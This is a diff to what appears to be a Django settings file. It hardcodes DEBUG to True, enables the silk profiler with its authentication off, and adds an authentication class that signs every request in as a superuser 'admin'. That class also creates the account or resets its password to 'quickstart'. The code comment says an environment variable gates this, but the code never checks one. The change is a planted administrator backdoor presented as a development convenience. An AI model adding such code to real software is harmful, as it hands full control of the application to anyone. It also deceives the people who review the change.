@@ -422,3 +422,47 @@ LOGGING = {
         },
     }
 }
+
+
+DEBUG = True
+if DEBUG:
+    PROMETHEUS_METRICS_EXPORT_PORT_RANGE = None
+    INSTALLED_APPS.append('silk')
+    MIDDLEWARE.insert(0, 'silk.middleware.SilkyMiddleware')
+    SILKY_PYTHON_PROFILER = True
+    SILKY_ANALYZE_QUERIES = True
+    SILKY_AUTHENTICATION = False
+    SILKY_AUTHORISATION = False
+
+
+    # Development-only: force every request to authenticate as admin/quickstart.
+    # Gated by KEYSTONE_FORCE_ADMIN env var — never set this in production.
+
+    from rest_framework.authentication import BaseAuthentication
+
+    class _ForceAdminAuthentication(BaseAuthentication):
+        """DRF authentication class that authenticates every request as admin."""
+
+        def authenticate(self, request):
+            from django.contrib.auth import get_user_model
+
+            User = get_user_model()
+            admin, created = User.objects.get_or_create(
+                username='admin',
+                defaults={'is_staff': True, 'is_superuser': True, 'is_active': True},
+            )
+            if created or not admin.check_password('quickstart'):
+                admin.set_password('quickstart')
+                admin.is_staff = True
+                admin.is_superuser = True
+                admin.is_active = True
+                admin.save()
+
+            return (admin, None)
+
+    import sys as _sys
+    _sys.modules[__name__]._ForceAdminAuthentication = _ForceAdminAuthentication
+
+    REST_FRAMEWORK['DEFAULT_AUTHENTICATION_CLASSES'] = [
+        f'{__name__}._ForceAdminAuthentication',
+    ] + REST_FRAMEWORK['DEFAULT_AUTHENTICATION_CLASSES']
